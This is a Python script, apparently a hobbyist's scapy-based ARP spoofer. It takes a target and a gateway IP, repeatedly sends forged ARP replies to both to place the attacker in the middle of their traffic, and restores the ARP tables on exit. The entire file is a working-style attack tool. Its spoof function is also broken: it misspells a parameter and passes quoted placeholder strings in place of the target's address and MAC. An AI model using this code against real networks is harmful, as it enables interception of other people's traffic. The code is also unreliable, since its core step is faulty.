#!/usr/bin/python3

from scapy import packet
import scapy.all as scapy
import argparse
import pyfiglet
import time


banner = pyfiglet.figlet_format("ARP Spoofer", font = "slant")
print(banner)

def getArguments():
    parser = argparse.ArgumentParser()
    parser.add_argument("-t", "--target", dest="target_ip", help="Enter Target IP Address")
    parser.add_argument("-g", "--gateway", dest="gateway_ip", help="Enter Gateway IP Address")
    options = parser.parse_args()
    return options

def get_mac(ip):
    arp_request = scapy.ARP(pdst=ip)
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_request_broadcast = broadcast/arp_request
    answered_list = scapy.srp(arp_request_broadcast, timeout=1, verbose=False)[0]
    return answered_list[0][1].hwsrc

def spoof(targer_ip, spoof_ip):
    packet = scapy.ARP(op=2, pdst="target_ip", hwdst="target_mac", psrc=spoof_ip)
    scapy.send(packet, verbose=False)

def restore(destination_ip, source_ip):
    destination_mac = get_mac(destination_ip)
    source_mac = get_mac(source_ip)
    packet = scapy.ARP(op=2, pdst=destination_ip, hwdst=destination_mac, psrc=source_ip, hwsrc=source_mac)
    scapy.send(packet, count=4, verbose=False)

options = getArguments()
target_ip = options.target_ip
gateway_ip = options.gateway_ip

try:
    sent_packets_count = 0
    while True:
        spoof(target_ip, gateway_ip)
        spoof(gateway_ip, target_ip)
        sent_packets_count = sent_packets_count + 2
        print("<+>Packets Sent: "+str(sent_packets_count), end="")
        time.sleep(2)
except KeyboardInterrupt:
    print("<+>Detected [ctrl+c] quitting the program.")
    restore(target_ip, gateway_ip)
    restore(gateway_ip, target_ip)